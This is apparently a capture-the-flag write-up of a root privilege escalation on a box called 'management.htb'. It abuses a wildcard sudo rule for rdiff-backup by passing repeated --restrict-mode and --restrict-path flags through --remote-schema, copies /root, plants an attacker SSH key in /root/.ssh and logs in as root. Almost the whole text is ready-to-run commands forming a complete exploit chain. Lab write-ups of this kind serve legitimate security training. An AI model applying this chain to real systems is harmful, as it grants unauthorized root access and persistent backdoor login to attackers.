So we can run rdiff-backup as root, but only in server mode, restricted to /opt/backup, read-only.

This is a classic setup for the rdiff-backup restrict-path bypass, so let’s see if we can break out of that restriction.

The sudo rule looks like this:

(root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
The key thing here is that trailing *.

Sudo only checks that the command literally starts with that string , it doesn’t care what comes after.

And since we control --remote-schema, we control the entire server-side command line.

rdiff-backup uses argparse, and argparse takes the last occurrence of a flag when you pass it twice.

So we append a second --restrict-mode read-write after the required read-only

rdiff-backup \
  --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --remote-tempdir %s --restrict-mode read-write' \
  --list-increments \
  dummyhost::/opt/backup
That works. Now we apply the same trick to --restrict-path and point it at /root

rdiff-backup \
  --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --remote-tempdir %s --restrict-mode read-write --restrict-path /root' \
  dummyhost::/root \
  /tmp/rootgrab
We now have root’s home directory mirrored locally.

Let’s get a proper shell , generate an SSH keypair.

ssh-keygen -t ed25519 -f /tmp/htbkey -N ''
Stage the authorized_keys

mkdir -p /tmp/fakessh
cat /tmp/htbkey.pub > /tmp/fakessh/authorized_keys
chmod 700 /tmp/fakessh
chmod 600 /tmp/fakessh/authorized_keys
Now push it into /root/.ssh.

We need --user-mapping-file here because rdiff-backup preserves source file ownership , without it the files land owned by owen and SSH rejects them.

Note the mapping format uses colons.

echo 'owen:root' > /tmp/usermap
echo 'owen:root' > /tmp/groupmap
rdiff-backup --force \
  --user-mapping-file /tmp/usermap \
  --group-mapping-file /tmp/groupmap \
  --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --remote-tempdir %s --restrict-mode read-write --restrict-path /root' \
  /tmp/fakessh \
  dummyhost::/root/.ssh
And then

ssh -i /tmp/htbkey root@management.htb
And BOOM! We are in as root.


Let’s grab the flag

cat /root/root.txt
And, box SOLVED!

